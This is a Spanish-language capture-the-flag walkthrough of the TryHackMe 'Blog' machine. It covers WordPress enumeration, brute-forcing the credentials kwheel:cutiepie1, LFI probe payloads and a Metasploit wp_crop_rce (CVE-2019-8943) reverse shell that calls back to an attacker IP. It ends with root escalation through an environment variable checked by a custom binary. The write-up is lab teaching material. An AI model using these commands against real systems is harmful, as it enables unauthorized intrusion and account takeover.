# 📄 Write-up CTF Blog - TryHackMe

## Introducción

Billy Joel ha creado un blog en su ordenador de casa y ha empezado a trabajar en él. ¡Será increíble! Nuestro objetivo es enumerar esta máquina y encontrar las 2 flags que se esconden en ella. Billy tiene algunas cosas extrañas en su portátil. ¿Podremos movernos y conseguir lo que necesitamos, o caeremos en la madriguera del conejo...?

---

## Paso 1: Verificación de Conectividad con `ping`

El primer paso es siempre asegurarnos de que podemos alcanzar la máquina objetivo en la red. Para ello, utilizamos la herramienta `ping`.

<img width="512" height="186" alt="Ping" src="https://github.com/user-attachments/assets/2caa7f39-9b8a-4c3a-b6ed-2c7a86acd104" />


**Comando utilizado:**

```bash
ping -c 4 10.10.30.133
````
(Nota: Sustituye la IP por la que te haya asignado TryHackMe si es diferente.)

Resultado:

La salida del comando confirma que la máquina está activa y accesible en la red.

---

# Paso 2: Escaneo de Puertos con `Nmap`

Una vez confirmada la conectividad, procedemos al reconocimiento profundo escaneando la máquina con `Nmap` para descubrir qué puertos están abiertos y qué servicios se están ejecutando.

<img width="906" height="739" alt="Nmap" src="https://github.com/user-attachments/assets/ce7f066a-2f76-48cb-bda1-08f9715a351e" />

**Comando utilizado:**

```bash
nmap -sC -sV 10.10.30.133
````
-sC: Ejecuta los scripts por defecto (enumeración básica).

-sV: Determina la versión del servicio que corre en los puertos.

Análisis de Servicios:

Puerto 80 (HTTP):

Ejecuta Apache httpd 2.4.29.

El título del sitio es: Billy Joel’s IT blog & The IT blog.

Pistas clave: Se detecta la carpeta /robots.txt con un archivo 1 disallowed entry y el directorio /wp-admin/, lo que sugiere fuertemente que el sitio web corre bajo WordPress.

Puerto 22 (SSH):

Servicio SSH abierto. Por ahora, no tenemos credenciales.

Puertos 139 y 445 (SMB/Samba):

Servicio Samba (compartición de archivos) abierto. Esto es un vector de ataque potencial para enumerar comparticiones de red.

Conclusión del paso:

El enfoque inicial debe ser el servicio web (HTTP) en el puerto 80, dado que es una instalación de WordPress. También exploraremos las comparticiones de Samba.

---

# Paso 3: Escaneo de WordPress con `wpscan`

Dado que el escaneo de Nmap sugirió la presencia de una instalación de WordPress, el siguiente paso lógico es utilizar la herramienta especializada `wpscan` para enumerar usuarios, vulnerabilidades y archivos importantes.

<img width="678" height="820" alt="wpscan" src="https://github.com/user-attachments/assets/ae164a6c-b660-4aee-a38e-930029f5ff94" />

**Comando utilizado (Asumido):**

```bash
wpscan --url [http://10.10.30.133](http://10.10.30.133)
````
Resultados Clave del Escaneo:

El escaneo reveló información valiosa sobre la configuración del sitio:

Versión de WordPress:

WordPress Version 5.0 identified (Insecure, released on 2018-12-06).

Se identificó una versión antigua y potencialmente insegura: WordPress 5.0.

Archivos y Funcionalidades Activas:

/robots.txt: Se encontró y hace referencia a /wp-admin/ y /wp-admin/admin-ajax.php.

XML-RPC: Se encontró y está habilitado (/xmlrpc.php), lo que a menudo puede ser utilizado para ataques de fuerza bruta.

Directorio de Subidas (/wp-content/uploads/): El listado del directorio está habilitado, lo cual es una mala práctica de seguridad.

wp-cron.php: Se encontró y está expuesto.

Plugins y Temas:

Plugins: El escaneo pasivo no encontró plugins instalados.

Temas: No se pudo identificar el tema principal.

Usuarios:

En este escaneo no se obtuvo información de usuarios.

Conclusión del paso:

La instalación utiliza una versión obsoleta e insegura (5.0), lo que abre la puerta a buscar vulnerabilidades públicas o conocidas para esta versión específica de WordPress. Además, el directorio de subidas expuesto es un punto de interés.

---

# Paso 4: Escaneo de Directorios con `Gobuster`

Para complementar la información obtenida con `wpscan` y asegurarnos de no perder directorios o archivos ocultos, ejecutamos una enumeración de directorios en el servidor web usando `Gobuster`.

<img width="792" height="691" alt="gobuster" src="https://github.com/user-attachments/assets/146d1cfa-4ab6-4fb2-883a-9354d156a0c6" />

**Comando utilizado (Ejemplo):**

```bash
gobuster dir -u [http://10.10.30.133](http://10.10.30.133) -w /ruta/a/wordlist.txt
````
Punto de Interés:

El recurso más destacable es el directorio con el nombre críptico /0. Aunque la herramienta nos redirige, es necesario explorarlo manualmente en el navegador o mediante curl para ver su contenido real, ya que no es un directorio estándar de WordPress.

Conclusión del paso:

Hemos recopilado toda la información inicial sobre el servicio web. El siguiente paso debe ser explotar la vulnerabilidad de la versión antigua de WordPress (5.0) o investigar la enumeración de usuarios, o bien, investigar el directorio /0.

---

# Paso 5: Análisis Manual del Sitio Web

Una vez completado el reconocimiento automatizado, procedemos a inspeccionar manualmente el sitio web en el puerto 80, analizando archivos clave como `robots.txt` y buscando información útil en el contenido visible.

## 5.1 Revisión de `robots.txt`

<img width="657" height="266" alt="robots txt vemos el user agent" src="https://github.com/user-attachments/assets/508d69f7-2eab-4f13-8a2d-70239b937793" />

Al acceder al archivo `robots.txt`, confirmamos las rutas de WordPress:

```text
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
````
Esta información es estándar y nos recuerda el directorio de administración, pero no revela pistas inmediatas de explotación.

5.2 Contenido del Blog

La página principal del blog contiene una única publicación visible: "A Note From Mom". Al analizar el contenido de esta nota, encontramos pistas cruciales:

<img width="1077" height="857" alt="pagina en wordpress" src="https://github.com/user-attachments/assets/ef2c1dc3-ebda-44da-8b17-b578ce1a08d9" />

Autor del post: Karen Wheeler. Esto nos proporciona el nombre de un posible usuario del sistema: karenwheeler o simplemente karen.

Contenido del mensaje: El mensaje, escrito por "Mom" (Karen Wheeler), menciona que Billy fue despedido recientemente ("With your recent firing...").

"Oh and don't forget to hide this post once you get up and running... that would be embarrassing lol!"

La nota, destinada a ser oculta, expone el nombre de un usuario (Karen Wheeler) y el estado laboral de Billy (el dueño de la máquina).

5.3 Acceso al Panel de Login

Al navegar al directorio de administración (/wp-admin/ o /wp-login.php), llegamos al panel de login de WordPress, que nos pide un Username o Email Address y Password.

<img width="946" height="618" alt="panel wplogin" src="https://github.com/user-attachments/assets/0f965322-6eb9-472f-b5bb-443e2dacc5d5" />

Usuario Encontrado: Basándonos en el post, tenemos un posible nombre de usuario para atacar: karenwheeler o karen.

Conclusión del paso:

Hemos encontrado un nombre de usuario potencial, karenwheeler o karen, que podemos utilizar en ataques de fuerza bruta o de enumeración de usuarios en los siguientes pasos, probablemente usando wpscan o xmlrpc.php.

---

# Paso 6: Pruebas de Inyección de Comandos y Alternativas

Una vez que hemos agotado la enumeración básica, probamos algunos vectores de ataque comunes, como la inyección de comandos o la inclusión de archivos, a través de parámetros URL expuestos, como el parámetro de búsqueda.

## 6.1 Pruebas a través del Parámetro de Búsqueda (`?a=`)

<img width="1063" height="433" alt="usamos el buscar para ver si hay opciones de entrar al directorio" src="https://github.com/user-attachments/assets/6ef4f194-6865-49d1-a5f6-ec9a14a94c1a" />

Al utilizar la funcionalidad de búsqueda del blog, observamos que el parámetro se refleja directamente en la URL (`blog.thm/?s=a`). Esto motiva a probar posibles vulnerabilidades:

1.  **Prueba de Inclusión de Archivos (LFI):**
    * Intentamos acceder al archivo de usuarios del sistema: `blog.thm/?s=../../../../etc/passwd`
    * **Resultado:** La aplicación no encontró resultados para la búsqueda, lo que indica que el parámetro `s` (search) no es vulnerable a LFI.

<img width="975" height="467" alt="intentamos etc passwd y no va" src="https://github.com/user-attachments/assets/d643f436-5b92-4550-ada0-a52713bb740d" />

3.  **Prueba de Inyección de Comandos (mediante un parámetro ficticio):**
    * Intentamos simular un parámetro de ejecución de comandos (`?cmd=`) con una inyección de ruta: `blog.thm/?cmd=../../../../etc/passwd`
    * **Resultado:** Esta prueba tampoco tuvo éxito, ya que el servidor simplemente interpretó el parámetro `cmd` como desconocido o lo ignoró, mostrando la página principal del blog.

<img width="1074" height="611" alt="con cdm delante probamos y tampoco" src="https://github.com/user-attachments/assets/d1b03e18-49b8-46e2-ad29-4bd5098d5ffc" />

6.2 Redirección de Enfoque

Las pruebas de LFI y de inyección de comandos en el parámetro de búsqueda no arrojaron resultados positivos.

---

# Paso 7: Búsqueda y Análisis del Exploit de WordPress 5.0

Dado que `wpscan` reveló que la instalación de WordPress está utilizando una versión antigua e insegura (5.0), el siguiente paso es buscar una vulnerabilidad conocida para esta versión.

---

## 7.1 Identificación de la Vulnerabilidad (CVE)

Una búsqueda rápida en bases de datos de vulnerabilidades utilizando la versión "WordPress 5.0" o "WordPress Crop-Image" nos lleva al siguiente CVE:

<img width="1513" height="655" alt="buscamos un exploit para la version de worpress" src="https://github.com/user-attachments/assets/a5acd91c-8cc7-4698-9e11-e5a4917fba54" />

* **CVE Identificado:** **CVE-2019-8943**.
    * **Descripción:** Esta vulnerabilidad afecta a WordPress versiones 5.0.0 a 4.9.8 y permite la **inclusión de archivos locales (LFI)** y el **recorrido de rutas (Path Traversal)** a través de la función de recorte de imágenes (`wp_crop_image()`). Un atacante puede manipular la referencia del archivo adjunto (`_wp_attached_file`) al recortar una imagen para cargar una *shell* en el sistema.

## 7.2 Análisis del Módulo de Explotación

La revisión del *exploit* en plataformas como Packet Storm (o un módulo de Metasploit) revela los requisitos y la funcionalidad:

<img width="1012" height="780" alt="leemos el exploit" src="https://github.com/user-attachments/assets/c006f4c3-eeb0-4fd9-99cc-b95e295bb193" />

* **Nombre del Exploit:** `WordPress Crop Shell Upload` (Exploit de carga de *shell* mediante recorte de imagen).
* **Mecanismo:** El módulo utiliza una vulnerabilidad de **recorrido de ruta** y **LFI**. El atacante, incluso con privilegios bajos (como un suscriptor o cualquier usuario autenticado), puede redimensionar una imagen y cambiar la referencia de la ruta del archivo adjunto para escribir contenido en un archivo arbitrario.
* **Requisitos:**
    * **`USERNAME`** y **`PASSWORD`** (se necesita un usuario autenticado).
    * El módulo está diseñado para sistemas basados en Unix (Linux).

**Conclusión del paso:**

Hemos identificado un vector de ataque de alta prioridad. Para explotarlo, necesitamos obtener las credenciales de un usuario. Esto nos lleva al siguiente paso: usar el nombre de usuario que encontramos en el Paso 5 (`karenwheeler` o `karen`) para obtener una contraseña.

---

# Paso 8: Preparación del Exploit en Metasploit

Para confirmar la funcionalidad y los requisitos del exploit CVE-2019-8943, utilizamos el *framework* de Metasploit.

## 8.1 Búsqueda y Selección del Módulo

Dentro de la consola de Metasploit (`msfconsole`), buscamos módulos relacionados con WordPress 5.0:

<img width="784" height="677" alt="usamos metsploit para buscarlo" src="https://github.com/user-attachments/assets/411f2edd-9b98-48ec-8180-07a724211aef" />

```bash
msf > search wordpress 5.0.0
````
El resultado confirma la existencia del módulo compatible:
````
#,Name, Disclosure Date, Rank, Check,Description
0,exploit/multi/http/wp_crop_rce,2019-02-19,`excellent, Yes, WordPress Crop-image Shell Upload
````
Seleccionamos el módulo para su uso:
````
msf > use 0
# O
msf > use exploit/multi/http/wp_crop_rce
````
8.2 Análisis de Opciones Requeridas

Al revisar las opciones del módulo (show options), confirmamos los parámetros necesarios para la ejecución:

<img width="935" height="508" alt="vemos las opciones del exploit" src="https://github.com/user-attachments/assets/84c16dcc-73fa-471f-886d-345c14462d08" />

````
Opción,Requerido,Descripción
RHOSTS,yes,La IP de la máquina objetivo (10.10.30.133).
RPORT,80,El puerto de destino.
TARGETURI,yes,La ruta base de la aplicación de WordPress (normalmente /).
USERNAME,yes,El nombre de usuario de WordPress para autenticarse.
PASSWORD,yes,La contraseña del usuario para autenticarse.
LHOST,yes,Nuestra IP de la máquina atacante.
LPORT,4444,El puerto de escucha para la reverse shell.
````
Requisito Crítico Confirmado:

El exploit es inútil sin un par de USERNAME y PASSWORD válidos. Nuestro siguiente paso debe ser obtener estas credenciales.

---

# Paso 9: Obtención de Credenciales (Enumeración de Usuarios y Fuerza Bruta)

Ahora que sabemos que necesitamos credenciales válidas para explotar la vulnerabilidad de WordPress (CVE-2019-8943), utilizamos `wpscan` para enumerar usuarios y realizar un ataque de fuerza bruta.

## 9.1 Enumeración de Usuarios con `wpscan`

Utilizamos `wpscan` para forzar la identificación de nombres de usuario:

<img width="874" height="535" alt="enumero con wpscan para usuarios" src="https://github.com/user-attachments/assets/fca0a66d-10a1-48c2-8d48-a8a7b20fcd60" />

**Comando utilizado (Ejemplo):**

```bash
wpscan --url [http://10.10.30.133](http://10.10.30.133) -e u
````
Usuarios Identificados:

La herramienta confirma la existencia de dos usuarios principales en el blog:

kwheel (Confirmado por el nombre Karen Wheeler del post anterior).

bjoel (Confirmado por el nombre Billy Joel).

Karen Wheeler (Nombre completo, posible alias o autor).

Billy Joel (Nombre completo, posible alias o autor).

El nombre de usuario más corto y probable para el login es kwheel (Karen Wheeler).

9.2 Ataque de Fuerza Bruta de Contraseñas

<img width="896" height="489" alt="wscan fuerza bruta para claves" src="https://github.com/user-attachments/assets/bba7240d-2ab9-4058-9212-c7ccb7a90d1a" />

Con los nombres de usuario identificados, ejecutamos un ataque de fuerza bruta en el panel de login, enfocándonos en el usuario kwheel y utilizando un wordlist común (como rockyou.txt o uno personalizado).

Comando utilizado (Ejemplo):
````
bash
wpscan --url [http://10.10.30.133](http://10.10.30.133) -U kwheel,bjoel -P /ruta/a/wordlist.txt
````
Credencial Encontrada:

El ataque de fuerza bruta resultó ser exitoso:
````
[SUCCESS] - kwheel / cutiepie1
````
Usuario: kwheel

Contraseña: cutiepie1

Conclusión del paso:

¡Hemos obtenido credenciales válidas! Con el par kwheel:cutiepie1, ahora tenemos todo lo necesario para explotar la vulnerabilidad de carga de shell y obtener acceso inicial a la máquina.

---

# Paso 10: Explotación de WordPress y Obtención de Acceso Inicial

Con las credenciales (`kwheel:cutiepie1`) y el módulo de Metasploit listo, procedemos a ejecutar el *exploit* **`exploit/multi/http/wp_crop_rce`** para obtener una *reverse shell*.

## 10.1 Configuración y Ejecución del Exploit

Configuramos las opciones necesarias en el módulo de Metasploit:

```bash
msf exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.30.133
msf exploit(multi/http/wp_crop_rce) > set LHOST 10.8.24.253 
msf exploit(multi/http/wp_crop_rce) > set LPORT 1234
msf exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
msf exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
msf exploit(multi/http/wp_crop_rce) > run
````
Resultado: El exploit se ejecuta con éxito, autenticándose con el usuario kwheel, subiendo la carga maliciosa (payload) y abriendo una sesión Meterpreter.

10.2 Estabilización de la Shell

Inmediatamente después de obtener la sesión Meterpreter, obtenemos una shell de Linux y la estabilizamos para facilitar la navegación y ejecución de comandos:

````
bash
meterpreter > shell
Process 24303 created.
Channel 6 created.
python -c 'import pty;pty.spawn("/bin/bash")'
````
Hemos obtenido acceso inicial como el usuario del servidor web www-data.

10.3 Búsqueda de la Primera Flag (user.txt)

Navegamos a los directorios del sistema en busca de la flag del usuario (user.txt). Localizamos el directorio personal de bjoel (Billy Joel) y encontramos el archivo:

````
bash
www-data@blog:/home$ cd bjoel
www-data@blog:/home/bjoel$ ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
www-data@blog:/home/bjoel$ cat user.txt
"ou won't find what you're looking for here."

TRY HARDER
````
Resultado: El archivo user.txt es una trampa. La primera flag no se encuentra aquí.

Conclusión del paso:

Hemos logrado el acceso inicial a la máquina como www-data explotando la vulnerabilidad de WordPress. El archivo user.txt es falso, lo que nos obliga a continuar la enumeración interna de la máquina.

---

# Paso 11: Descubrimiento y Descarga del Binario `checker`

Continuamos la enumeración del sistema interno buscando archivos inusuales que puedan conducir a la escalada de privilegios o a la *flag*.

## 11.1 Descubrimiento del Binario

Durante la enumeración del sistema, se descubre un binario no estándar ubicado en `/usr/sbin/checker`. Intentamos ejecutarlo:

<img width="359" height="623" alt="descubrimos el binario " src="https://github.com/user-attachments/assets/73ec5ae6-c76a-474c-a4bd-15daf83762dc" />

```bash
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
Not an Admin
````
Resultado: La ejecución falla y devuelve la cadena "Not an Admin", lo que sugiere que el binario realiza algún tipo de verificación de privilegios o pertenencia a un grupo. Es un objetivo obvio para analizar.

11.2 Descarga del Binario para Análisis Local

Dado que la máquina está comprometida, podemos utilizar las capacidades de Metasploit para descargar el binario a nuestra máquina local de Kali Linux para un análisis más profundo (como strings o reverse engineering).

<img width="1534" height="385" alt="me descargo el binario" src="https://github.com/user-attachments/assets/a8827c37-602a-44e3-8294-9577cd94cb20" />

Comando utilizado (Desde la sesión Meterpreter):

````
bash
meterpreter > download /usr/sbin/checker /home/quiqu3h4ck/Blog/checker
````
Resultado: El archivo se descarga exitosamente a la máquina del atacante.

Conclusión del paso:

Hemos encontrado un binario personalizado que puede ser la clave para la escalada de privilegios. El siguiente paso será analizar este binario para entender su funcionamiento y la razón por la que devuelve "Not an Admin".

---

# Paso 12: Análisis del Binario `checker` con Ghidra

Tras descargar el binario sospechoso `/usr/sbin/checker` a nuestra máquina local, lo abrimos con una herramienta de ingeniería inversa (como Ghidra) para descompilarlo y entender su lógica interna.

## 12.1 Descompilación y Análisis del Código

El análisis del código descompilado en Ghidra revela la siguiente estructura lógica en la función `main`:

<img width="1079" height="493" alt="uso ghidra para descompilarlo" src="https://github.com/user-attachments/assets/1f377bc4-bfae-4b79-8821-4227e6bd5c86" />

```c
void main(void)
{
  char *pcVar1;

  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
````
12.2 Interpretación de la Lógica

La lógica del programa es simple pero crítica:

Obtener Variable de Entorno: El binario intenta obtener el valor de una variable de entorno específica llamada admin mediante la función getenv("admin").

Verificación: Comprueba si el valor de pcVar1 (la variable de entorno admin) es nulo ((char *)0x0).

Si es NULO (NO se encontró admin): Imprime el mensaje de error "Not an Admin" y termina (lo que vimos en el Paso 11).

Si NO es NULO (SÍ se encontró admin):

Llama a setuid(0), que cambia la ID de usuario efectiva al UID 0 (root).

Llama a system("/bin/bash"), que ejecuta un shell con los nuevos privilegios de root.

Conclusión del paso:

El binario es vulnerable a un ataque de escalada de privilegios a través de variables de entorno. Simplemente necesitamos ejecutar el binario después de establecer la variable de entorno admin a cualquier valor (no nulo) para obtener una shell de root.

---

# Paso 13: Escalada de Privilegios y Captura de Flags

Con el análisis del binario `checker` completado, procedemos a explotar la vulnerabilidad de la variable de entorno para escalar privilegios a `root`.

## 13.1 Ejecución del Exploit de Variables de Entorno

Desde la shell `www-data` que obtuvimos en el Paso 10, establecemos la variable de entorno `admin` a cualquier valor y ejecutamos el binario:

<img width="766" height="386" alt="cambiando la variable admin ya soy root y tengo la falg root" src="https://github.com/user-attachments/assets/9cfd7d0d-8952-476a-9bbd-19ab93c85788" />

**Comandos utilizados:**

```bash
www-data@blog:/var/www/wordpress$ export admin=admin
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
````
Resultado: El binario detecta la variable admin, llama a setuid(0) y nos otorga una shell con privilegios de root (root@blog).

13.2 Captura de la Flag de Root (root.txt)

Una vez como root, la flag final suele encontrarse en el directorio /root.

Comandos utilizados:

````
bash
root@blog:/var/www/wordpress# cd /root
root@blog:/root# ls
root.txt
root@blog:/root# cat root.txt
9a0l...
````
FLAG DE ROOT CAPTURADA: 9a0l...[Contenido Oculto]

13.3 Captura de la Flag de Usuario Real (user.txt)

Aunque el primer user.txt fue un señuelo, ahora que tenemos privilegios de root, podemos buscar la flag real del usuario en todo el sistema.

<img width="457" height="132" alt="utilizo comando find para buscar la flag user" src="https://github.com/user-attachments/assets/3ac7fe97-f6b5-4ad4-9bff-df15d39a49fe" />

Comando utilizado:

````
bash
root@blog:/root# find / -name user.txt 2>/dev/null
````
Resultado del find: La flag real del usuario se encuentra en una ubicación inusual: /media/usb/user.txt.

Comandos utilizados:
````
Bash
root@blog:/root# cat /media/usb/user.txt
c842...
````
FLAG DE USUARIO CAPTURADA: c842...[Contenido Oculto]

---
